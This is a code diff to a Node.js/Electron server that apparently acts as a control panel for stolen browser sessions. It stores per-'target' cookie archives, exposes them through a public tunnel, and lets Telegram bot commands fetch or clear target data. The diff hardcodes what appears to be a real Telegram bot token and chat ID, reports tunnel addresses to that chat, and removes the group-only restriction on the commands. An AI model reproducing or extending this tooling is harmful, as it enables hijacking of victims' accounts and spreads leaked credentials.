@@ -11,48 +11,30 @@ const electron = require("electron");
 const express = require("express");
 const http = require("http");
 const path = require("path");
-const TelegramBot = require('node-telegram-bot-api'); // Import Telegram bot library
-const compression = require('compression'); // Import compression middleware
-const morgan = require('morgan'); // Import morgan for logging
+const TelegramBot = require('node-telegram-bot-api');
+
+// Initialize Telegram Bot with your bot token
+const botToken = '6464682205:AAFxM4phl4jFwoWe-2SaSq4pVUoUEdH7xmU'; // Replace with your Telegram bot token
+const bot = new TelegramBot(botToken, { polling: true });
+
+// Define your chat ID here
+const chatId = '-4576169097'; // Replace with your actual chat ID
 
 const app = express();
 const server = http.createServer(app);
 const io = new socketIo.Server(server);
 const PORT = process.env.PORT || getConfig('port');
 
-// Initialize Telegram Bot
-const botToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
-const bot = new TelegramBot(botToken, { polling: true });
-
-// Setup server
 serverInit();
-
-// Use compression middleware to speed up responses
-app.use(compression());
-
-// Serve static files with caching enabled for better performance
-app.use(express.static(path.join(__dirname, "public"), {
-    maxAge: '1y', // Cache static assets for one year
-    etag: false
-}));
-
-// Use morgan for logging HTTP requests
-app.use(morgan('combined'));
-
-// Parse URL-encoded bodies and JSON data
+app.use(express.static(path.join(__dirname, "public")));
 app.use(express.urlencoded({ extended: false }));
-app.use(express.json());
-
-// Set view engine and views directory
 app.set("views", path.join(__dirname, 'views'));
-app.set("view engine", "ejs");
-
-// Capture device information and parse cookies
 app.use(expressDevice.capture());
+app.set("view engine", "ejs");
+app.use(expressFileupload());
 app.use(cookieParser());
-
-// File upload middleware is loaded only when needed
-app.use("/ws-app", expressFileupload(), require("./router/ws-app"));
+app.use(express.json());
+global.IO = io;
 
 // CORS configuration
 app.use(function (req, res, next) {
@@ -61,50 +43,41 @@ app.use(function (req, res, next) {
     next();
 });
 
-// Admin routes
+// Route handlers
+app.use("/ws-app", require("./router/ws-app"));
 app.use("/", require("./router"));
 app.use("/panel", require("./router/panel"));
 
-// Start server and tunnel initialization in parallel
-server.listen(PORT, async () => {
-    try {
-        const tunnelPromise = startTunnel();
-        cout.out(`LOCAL SERVER  : http://localhost:${PORT}`);
+// Send a startup message to the specified Telegram chat
+bot.sendMessage(chatId, 'Server has started successfully.');
 
-        const tunnelUrl = await tunnelPromise;
-        cout.out(`TUNNEL SERVER : ${tunnelUrl}`);
-    } catch (error) {
-        cout.err(`Failed to start tunnel: ${error.message}`);
-    }
+server.listen(PORT, async () => {
+    await startTunnel();
+    cout.out(`LOCAL SERVER  : http://localhost:${PORT}`);
+    cout.out(`TUNNEL SERVER : ${process.env.WSTUNNELURL}`);
+    // Notify in Telegram once the server is ready
+    bot.sendMessage(chatId, `Server is running on http://localhost:${PORT}`);
+    bot.sendMessage(chatId, `Tunnel is available at ${process.env.WSTUNNELURL}`);
 });
 
 // Electron app initialization
 electron.app.on("ready", () => {
     cout.out("Electron browser ready.");
+    bot.sendMessage(chatId, 'Electron app is ready.');
 });
 
 // Handle all windows being closed
 electron.app.on('window-all-closed', () => {
     if (process.platform !== 'darwin') {
         electron.app.quit();
+        bot.sendMessage(chatId, 'Electron app has been closed.');
     }
 });
 
 // Telegram Bot command handlers
-
-// Function to check if the message is from a group and addressed to the bot
-const isMessageForBot = (msg) => {
-    return msg.chat.type === 'group' || msg.chat.type === 'supergroup';
-};
-
 bot.onText(/\/get_data (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    const targetId = match[1]; // Captures the target ID from the command
-
-    if (!isMessageForBot(msg)) {
-        bot.sendMessage(chatId, "This command is only available in groups.");
-        return;
-    }
+    const targetId = match[1];
 
     if (!targetDB.info().collections.includes(targetId)) {
         bot.sendMessage(chatId, "Target not found");
@@ -117,14 +90,7 @@ bot.onText(/\/get_data (.+)/, (msg, match) => {
 });
 
 bot.onText(/\/clear_cookies (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
     const targetId = match[1];
-
-    if (!isMessageForBot(msg)) {
-        bot.sendMessage(chatId, "This command is only available in groups.");
-        return;
-    }
-
     const cookiesFilePath = path.join(__dirname, "ssd", "cookies", `${targetId}.wszip`);
 
     if (fs.existsSync(cookiesFilePath)) {
@@ -138,29 +104,12 @@ bot.onText(/\/clear_cookies (.+)/, (msg, match) => {
 });
 
 bot.onText(/\/generate_iframe (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const url = match[1]; // Captures the URL from the command
-
-    if (!isMessageForBot(msg)) {
-        bot.sendMessage(chatId, "This command is only available in groups.");
-        return;
-    }
-
-    // Generate the iframe code
+    const url = match[1];
     const iframeCode = `<iframe src="${url}" width="600" height="400"></iframe>`;
-
-    // Send the iframe code back to the user
     bot.sendMessage(chatId, `Here is your iframe code:\n${iframeCode}`);
 });
 
 bot.onText(/\/restart_server/, (msg) => {
-    const chatId = msg.chat.id;
-
-    if (!isMessageForBot(msg)) {
-        bot.sendMessage(chatId, "This command is only available in groups.");
-        return;
-    }
-
     bot.sendMessage(chatId, "Server is restarting...");
     server.close(() => {
         process.exit(0);
